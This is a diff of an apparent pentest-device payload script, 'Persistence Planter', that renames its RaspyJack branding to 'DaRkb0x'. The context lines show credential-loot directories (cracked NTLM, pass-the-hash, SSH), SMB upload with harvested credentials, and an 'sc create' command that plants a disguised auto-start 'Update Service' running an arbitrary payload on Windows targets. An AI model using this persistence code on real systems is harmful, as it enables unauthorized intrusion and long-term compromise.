@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-RaspyJack Payload -- Persistence Planter
+DaRkb0x Payload -- Persistence Planter
 -----------------------------------------
 Post-exploitation persistence installer for authorized penetration testing.
 Uses impacket/smbclient to plant persistence on compromised Windows targets.
@@ -53,12 +53,12 @@ LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
 WIDTH, HEIGHT = LCD.width, LCD.height
 font = scaled_font()
 
-LOOT_DIR = "/root/Raspyjack/loot/Persistence"
+LOOT_DIR = "/root/DaRkb0x/loot/Persistence"
 CRED_DIRS = [
-    "/root/Raspyjack/loot/CrackedNTLM",
-    "/root/Raspyjack/loot/DefaultCreds",
-    "/root/Raspyjack/loot/SSH",
-    "/root/Raspyjack/loot/PtH",
+    "/root/DaRkb0x/loot/CrackedNTLM",
+    "/root/DaRkb0x/loot/DefaultCreds",
+    "/root/DaRkb0x/loot/SSH",
+    "/root/DaRkb0x/loot/PtH",
 ]
 IMPLANT_NAME = "RJUpdate"
 os.makedirs(LOOT_DIR, exist_ok=True)
@@ -242,7 +242,7 @@ def _smb_upload(cred, target_ip, share, remote_path, local_content):
     password = cred.get("password", "")
     domain = cred.get("domain", "WORKGROUP")
 
-    tmp = f"/tmp/rj_persist_{_ts()}.tmp"
+    tmp = f"/tmp/db_persist_{_ts()}.tmp"
     with open(tmp, "w") as f:
         f.write(local_content)
 
@@ -317,7 +317,7 @@ def _plant_service(cred, target_ip, payload_cmd, cleanup=False):
         return code == 0, out
     cmd = (
         f'sc create "{IMPLANT_NAME}" binPath= "cmd /c {payload_cmd}" '
-        f'start= auto DisplayName= "RaspyJack Update Service"'
+        f'start= auto DisplayName= "DaRkb0x Update Service"'
     )
     code, out = _exec_remote(cred, target_ip, cmd)
     if code == 0:
